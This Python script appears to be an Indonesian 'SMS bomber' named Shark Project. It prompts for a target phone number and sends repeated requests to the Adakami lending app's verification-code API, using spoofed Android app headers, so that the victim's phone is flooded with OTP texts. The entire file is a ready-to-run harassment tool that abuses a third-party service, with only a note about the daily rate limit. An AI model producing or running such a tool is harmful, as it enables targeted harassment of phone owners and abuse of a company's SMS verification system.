# -*- coding: utf-8 -*-
# Author By AbilSeno
# Modified By JerkKids
import requests, json, sys, os
from fake_useragent import UserAgent



hd = {
	"content-type": "application/json; charset=UTF-8",
	"content-length": "34",
	"accept-encoding": "gzip",
	"user-agent": "okhttp/3.8.0",
	"accept-language": "in",
	"x-ada-token": "",
	"x-ada-appid": "800006",
	"x-ada-os": "android",
	"x-ada-channel": "default",
	"x-ada-mediasource": "",
	"x-ada-agency": "adtubeagency",
	"x-ada-campaign": "AdakamiCampaign",
	"x-ada-role": "1",
	"x-ada-appversion": "1.7.0",
	"x-ada-device": "",
	"x-ada-model": "SM-G935FD",
	"x-ada-os-ver": "7.1.1",
	"x-ada-androidid": "a4341a2sa90a4d97",
	"x-ada-aid": "c7bbb23d-a220-4d43-9caf-153608f9bd39",
	"x-ada-afid": "1580054114839-7395423911531673296",
}
os.system('cls' if os.name == 'nt' else 'clear')
os.chdir('..')
os.system('cat banner.txt')
os.chdir('..')
print("==========================")
print("=      Shark Project     =")
print("==========================")
print("Disclaimer")
print("Limit Hanya 5x Untuk 1 Nomer/Hari\n")
no = input("Contoh : 088xxxx\nSilahkan Masukkan Nomer Target : ")
dat = {"ketik":0,"nomor":no}
datjson = json.dumps(dat)
r = requests.Session()
print(" ")
for x in range(6):
	try:
		a = r.post("https://api.adakami.id/adaKredit/pesan/kodeVerifikasi",data=datjson,headers=hd,timeout=10).text
		if a == '{"result":-1,"resultMessage":"Permintaan Kode Verifikasi Telah Mencapai Batas.Silakan Coba Lagi Lain Kali.","content":null}':
			print(f"Limit Harian Terdeteksi Coba Lagi Lain Kali")
		elif a == '{"result":-1,"resultMessage":"Gagal","content":null}':
			print(f"[•] [Fail] [Nomor Hp Target Invalid!]")
		else:
			print(f"[Success] Spam SMS Ke No {no}")
	except requests.exceptions.ConnectionError:
		print("Sepertinya Koneksi Anda Error")
